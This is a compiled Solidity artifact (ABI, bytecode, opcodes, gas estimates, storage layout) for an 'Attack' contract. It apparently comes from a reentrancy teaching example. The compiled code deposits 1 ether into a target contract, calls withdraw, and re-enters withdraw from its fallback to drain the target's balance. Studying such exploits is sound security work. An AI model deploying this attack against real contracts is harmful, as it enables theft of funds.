{"contracts/ReentrantVulnerable.sol":{"Attack":{"abi":[{"inputs":[{"internalType":"address","name":"_reentrantVulnerableAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"stateMutability":"payable","type":"fallback"},{"inputs":[],"name":"attack","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"reentrantVulnerable","outputs":[{"internalType":"contract ReentrantVulnerable","name":"","type":"address"}],"stateMutability":"view","type":"function"}],"devdoc":{"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"linkReferences":{},"object":"608060405234801561001057600080fd5b506040516104c93803806104c9833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b6103b2806101176000396000f3fe6080604052600436106100385760003560e01c806312065fe01461010257806333684a051461012d5780639e5faafc1461015857610039565b5b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101005760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100e757600080fd5b505af11580156100fb573d6000803e3d6000fd5b505050505b005b34801561010e57600080fd5b50610117610162565b60405161012491906102c7565b60405180910390f35b34801561013957600080fd5b5061014261016a565b60405161014f9190610361565b60405180910390f35b61016061018e565b005b600047905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a76400003410156101a357600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561021357600080fd5b505af1158015610227573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561029457600080fd5b505af11580156102a8573d6000803e3d6000fd5b50505050565b6000819050919050565b6102c1816102ae565b82525050565b60006020820190506102dc60008301846102b8565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061032761032261031d846102e2565b610302565b6102e2565b9050919050565b60006103398261030c565b9050919050565b600061034b8261032e565b9050919050565b61035b81610340565b82525050565b60006020820190506103766000830184610352565b9291505056fea2646970667358221220168b2a19ecfe4cc0994650c721fd6df574d75158a91beee6e58d5cdb4d8d7b8f64736f6c634300081c0033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x4C9 CODESIZE SUB DUP1 PUSH2 0x4C9 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0xDB JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x108 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xA8 DUP3 PUSH2 0x7D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB8 DUP2 PUSH2 0x9D JUMP JUMPDEST DUP2 EQ PUSH2 0xC3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xD5 DUP2 PUSH2 0xAF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xF1 JUMPI PUSH2 0xF0 PUSH2 0x78 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xFF DUP5 DUP3 DUP6 ADD PUSH2 0xC6 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x3B2 DUP1 PUSH2 0x117 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x102 JUMPI DUP1 PUSH4 0x33684A05 EQ PUSH2 0x12D JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x158 JUMPI PUSH2 0x39 JUMP JUMPDEST JUMPDEST PUSH8 0xDE0B6B3A7640000 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x100 JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xE7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xFB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x10E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x117 PUSH2 0x162 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x124 SWAP2 SWAP1 PUSH2 0x2C7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x139 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x142 PUSH2 0x16A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x14F SWAP2 SWAP1 PUSH2 0x361 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x160 PUSH2 0x18E JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x1A3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x213 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x227 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x294 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2A8 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2C1 DUP2 PUSH2 0x2AE JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2DC PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2B8 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x327 PUSH2 0x322 PUSH2 0x31D DUP5 PUSH2 0x2E2 JUMP JUMPDEST PUSH2 0x302 JUMP JUMPDEST PUSH2 0x2E2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x339 DUP3 PUSH2 0x30C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x34B DUP3 PUSH2 0x32E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x35B DUP2 PUSH2 0x340 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x376 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x352 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 AND DUP12 0x2A NOT 0xEC INVALID 0x4C 0xC0 SWAP10 CHAINID POP 0xC7 0x21 REVERT PUSH14 0xF574D75158A91BEEE6E58D5CDB4D DUP14 PUSH28 0x8F64736F6C634300081C003300000000000000000000000000000000 "},"gasEstimates":{"creation":{"codeDepositCost":"189200","executionCost":"infinite","totalCost":"infinite"},"external":{"":"infinite","attack()":"infinite","getBalance()":"317","reentrantVulnerable()":"infinite"}},"methodIdentifiers":{"attack()":"9e5faafc","getBalance()":"12065fe0","reentrantVulnerable()":"33684a05"}},"storageLayout":{"storage":[{"astId":7153,"contract":"contracts/ReentrantVulnerable.sol:Attack","label":"reentrantVulnerable","offset":0,"slot":"0","type":"t_contract(ReentrantVulnerable)7150"}],"types":{"t_contract(ReentrantVulnerable)7150":{"encoding":"inplace","label":"contract ReentrantVulnerable","numberOfBytes":"20"}}},"userdoc":{"kind":"user","methods":{},"version":1}}}}